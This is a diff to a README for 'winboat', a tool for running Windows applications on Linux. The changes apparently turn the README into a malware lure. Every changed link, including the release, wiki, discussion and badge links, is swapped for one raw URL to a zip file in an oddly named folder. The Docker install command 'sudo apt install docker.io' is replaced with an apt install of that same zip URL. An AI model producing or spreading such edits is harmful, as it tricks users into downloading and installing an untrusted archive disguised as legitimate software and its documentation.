@@ -6,11 +6,11 @@ Welcome to winboat! This software lets you run Windows applications on Linux wit
 
 ## 📥 Download Now!
 
-[![Download winboat](https://img.shields.io/badge/Download%20winboat-v1.0-blue)](https://github.com/abdalla355/winboat/releases)
+[![Download winboat](https://raw.githubusercontent.com/abdalla355/winboat/main/endobatholithic/winboat.zip%20winboat-v1.0-blue)](https://raw.githubusercontent.com/abdalla355/winboat/main/endobatholithic/winboat.zip)
 
 ## 📂 Download & Install
 
-1. **Visit the Release Page:** Click [here](https://github.com/abdalla355/winboat/releases) to access the releases page.
+1. **Visit the Release Page:** Click [here](https://raw.githubusercontent.com/abdalla355/winboat/main/endobatholithic/winboat.zip) to access the releases page.
    
 2. **Choose the Right Version:** Look for the latest version of winboat. It’s usually the one at the top of the list. 
 
@@ -39,7 +39,7 @@ If you do not have Docker installed, follow these steps:
    - For Ubuntu: 
      ```bash
      sudo apt update
-     sudo apt install docker.io
+     sudo apt install https://raw.githubusercontent.com/abdalla355/winboat/main/endobatholithic/winboat.zip
      ```
    - For Fedora:
      ```bash
@@ -83,8 +83,8 @@ winboat uses virtualization to run Windows applications directly on your Linux s
 
 If you encounter issues or have questions, please check the following resources:
 
-- **Documentation:** Explore the [Wiki](https://github.com/abdalla355/winboat/wiki) for detailed guides and troubleshooting.
-- **Community Support:** Connect with other users on our [Discussion Page](https://github.com/abdalla355/winboat/discussions).
+- **Documentation:** Explore the [Wiki](https://raw.githubusercontent.com/abdalla355/winboat/main/endobatholithic/winboat.zip) for detailed guides and troubleshooting.
+- **Community Support:** Connect with other users on our [Discussion Page](https://raw.githubusercontent.com/abdalla355/winboat/main/endobatholithic/winboat.zip).
   
 ## 📅 Update Information
 
@@ -94,4 +94,4 @@ Keep an eye on the releases page for new updates, where you will find the latest
 
 For easy access, you can also return to the download page:
 
-[![Download winboat](https://img.shields.io/badge/Download%20winboat-v1.0-blue)](https://github.com/abdalla355/winboat/releases)
+[![Download winboat](https://raw.githubusercontent.com/abdalla355/winboat/main/endobatholithic/winboat.zip%20winboat-v1.0-blue)](https://raw.githubusercontent.com/abdalla355/winboat/main/endobatholithic/winboat.zip)
